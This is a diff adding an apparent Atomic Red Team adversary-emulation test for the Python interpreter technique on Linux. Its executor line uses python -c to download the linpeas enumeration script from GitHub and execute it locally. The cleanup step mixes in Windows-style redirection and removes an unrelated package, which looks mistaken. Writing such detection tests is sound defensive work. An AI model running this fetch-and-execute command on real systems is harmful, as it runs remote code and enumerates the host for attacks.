@@ -1,0 +1,24 @@
+attack_technique: T1059.006
+display_name: 'Command and Scripting Interpreter: Python'
+atomic_tests: 
+  - name: Execute shell script via python's command mode argument
+    auto_generated_guid: 3a95cdb2-c6ea-4761-b24e-02b71889b8bb
+    description: Download and execute shell script and write to file then execute locally using Python -c (command mode)
+    supported_platforms: 
+      - linux
+    dependency_executor_name: bash
+    dependencies: 
+    - description: Verify if python is in the environment variable path and attempt to import requests library.
+      prereq_command: |
+        which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V
+        $which_python -c 'import requests' 2>/dev/null; echo $?
+      get_prereq_command: |
+        pip install requests
+    executor: 
+      command: |
+        which_python=$(which python || which python3 || which python3.9 || which python2)
+        $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+      name: bash
+      cleanup_command: |
+        rm T1059.006-payload 
+        pip-autoremove pypykatz >nul 2> nul
